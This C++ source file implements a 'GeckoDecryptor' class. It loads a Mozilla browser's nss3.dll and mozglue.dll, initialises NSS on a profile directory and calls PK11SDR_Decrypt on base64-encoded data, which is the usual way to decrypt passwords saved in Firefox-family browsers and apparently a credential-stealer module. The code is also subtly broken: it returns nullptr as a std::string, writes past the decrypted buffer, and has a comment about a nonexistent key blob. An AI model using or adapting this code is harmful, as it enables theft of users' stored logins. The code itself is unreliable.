#include "includes\GeckoDecryptor.h"

GeckoDecryptor::GeckoDecryptor() {}
GeckoDecryptor::~GeckoDecryptor() {
	// Free memory allocated for master_key_blob if it's not null

	if (m_NssShutdown)
		m_NssShutdown();
	FreeLibrary(m_hNss3);
	FreeLibrary(m_hMozGlue);
}

bool GeckoDecryptor::GeckoDecryptorInit(std::string& target_mozilla_browser)
{
	try
	{
		const auto mozglue_dll_path = target_mozilla_browser + "\\mozglue.dll";
		const auto nss_3_dll_path = target_mozilla_browser + "\\nss3.dll";

		std::wstring wide_mozglue_dll_path = std::wstring(mozglue_dll_path.begin(), mozglue_dll_path.end());
		std::wstring wide_mss3_dll_path = std::wstring(nss_3_dll_path.begin(), nss_3_dll_path.end());

		m_hMozGlue = LoadLibrary(wide_mozglue_dll_path.c_str());
		m_hNss3 = LoadLibrary(wide_mss3_dll_path.c_str());

		//m_hMozGlue = LoadLibraryA(mozglue_dll_path.c_str());
		//m_hNss3 = LoadLibraryA(mozglue_dll_path.c_str());

		if (!m_hMozGlue || !m_hNss3) return false;

		m_NssInit = reinterpret_cast<NssInit*>(GetProcAddress(m_hNss3, "NSS_Init"));
		m_ipNssPk11SdrDecrypt = reinterpret_cast<Pk11SdrDecrypt*>(GetProcAddress(m_hNss3, "PK11SDR_Decrypt"));
		m_NssShutdown = reinterpret_cast<NssShutdown*>(GetProcAddress(m_hNss3, "NSS_Shutdown"));

		return true;
	}
	catch (...)
	{
		return false;
	}

	return false;
}

std::string decode_base64(std::string MasterString)
{
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;

	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		std::cout << "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		std::cout << "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	return std::string(binaryKey.begin(), binaryKey.end());
}

bool GeckoDecryptor::set_profile_dir(std::string profile_dir)
{
	//NssInit requires a path of working dir i guess. resolve this issue!
	return (m_NssInit((char*)profile_dir.c_str()) == 0);
}

bool GeckoDecryptor::decrypt_data(const std::string& encrypted_data, std::string& decrypted_data)
{
	try
	{
		auto base_decoded = decode_base64(encrypted_data);
		SECItem in, out;

		in.type = SECItemType::siBuffer;
		in.data = (unsigned char*)base_decoded.c_str();
		in.len = base_decoded.length();

		if (m_ipNssPk11SdrDecrypt(&in, &out, NULL) != 0)
		{
			return false;
		}

		out.data[int(out.len)] = '\0';

		decrypted_data = reinterpret_cast<char*>(out.data);
	}
	catch (...)
	{
		return false;
	}

	return true;
}
